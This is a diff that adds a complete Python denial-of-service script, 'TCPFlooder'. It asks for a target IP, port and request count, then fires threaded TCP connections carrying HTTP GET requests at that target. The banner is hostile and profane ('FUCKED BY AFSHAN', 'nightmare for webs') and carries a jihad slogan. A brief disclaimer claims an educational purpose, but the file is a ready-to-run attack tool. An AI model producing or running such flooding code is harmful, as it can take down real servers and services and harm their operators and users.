@@ -1,0 +1,80 @@
+import os
+import time
+import socket
+import threading
+from datetime import datetime
+
+class TCPFlooder:
+    def __init__(self, target_ip, target_port, num_packets, delay):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.num_packets = num_packets
+        self.delay = delay
+        self.sent_packets = 0
+        self.errors = 0
+        
+
+    def send_packet(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((self.target_ip, self.target_port))
+            request = b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n"
+            sock.send(request)
+            self.sent_packets += 1
+            print("\033[92mPacket {} sent to {}:{} at {} with request {}!\033[0m".format(self.sent_packets, self.target_ip, self.target_port, datetime.now().strftime('%H:%M:%S'), request.decode()))
+            sock.close()
+        except socket.timeout:
+            self.errors += 1
+            print(f"\033[91mTimeout error sending packet {self.sent_packets+1} to {self.target_ip}:{self.target_port} at {datetime.now().strftime('%H:%M:%S')}\033[0m")
+        except ConnectionRefusedError:
+            self.errors += 1
+            print(f"\033[91mConnection refused error sending packet {self.sent_packets+1} to {self.target_ip}:{self.target_port} at {datetime.now().strftime('%H:%M:%S')}\033[0m")
+        except socket.error as e:
+            self.errors += 1
+            print(f"\033[91mError sending packet {self.sent_packets+1} to {self.target_ip}:{self.target_port} at {datetime.now().strftime('%H:%M:%S')}: {e}\033[0m")
+
+    def start_flood(self):
+        threads = []
+        for _ in range(self.num_packets):
+            thread = threading.Thread(target=self.send_packet)
+            thread.start()
+            threads.append(thread)
+            time.sleep(self.delay)
+        for thread in threads:
+            thread.join()
+
+        print("\033[91m")
+        print(f"Flood complete! Sent {self.sent_packets} packets with {self.errors} errors to {self.target_ip}:{self.target_port}.")
+        print("\033[0m")
+        
+def main():
+    print("\033[91m")
+    print("______________________________________________________")
+    print("                  𝐅𝐔𝐂𝐊𝐄𝐃 𝐁𝐘 𝐀𝐅𝐒𝐇𝐀𝐍                  ")
+    print("______________________________________________________")
+    print("\033[0m")
+    print("\033[92m")
+    print("** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** **")
+    print("**                                              **")
+    print("**        𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗-𝗦𝗘𝗖𝗨𝗥𝗘 𝗬𝗢𝗨 𝗪𝗘𝗕        **")
+    print("**                                              **")
+    print("** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** **")
+    print("𝙲𝙾𝙳𝙴𝙳 𝙱𝚈 : 𝐀𝐅𝐒𝐇𝐀𝐍 ")
+    print("This tool can become nightmare for webs")
+    print("Disclaimer: I am not responsible for any misuse of this code. Please use this repository responsibly and within the bounds of the law, This repository is for educational purposes only. I do not condone or encourage any illegal activities, including DDOS attacks, This repository is licensed under the MIT License.")
+    print("\033[0m") 
+    print("\033[91m")
+    print("~ال- جِھاد ول- جِهاد ")
+    print("\033[0m")
+
+    target_ip = input("Enter the target IP: ")
+    target_port = int(input("Enter the target port: "))
+    num_packets = int(input("Enter the number of packets to send: "))
+    delay = float(input("Enter the delay between packets (in seconds): "))
+
+    flooder = TCPFlooder(target_ip, target_port, num_packets, delay)
+    flooder.start_flood()
+
+if __name__ == "__main__":
+    main()
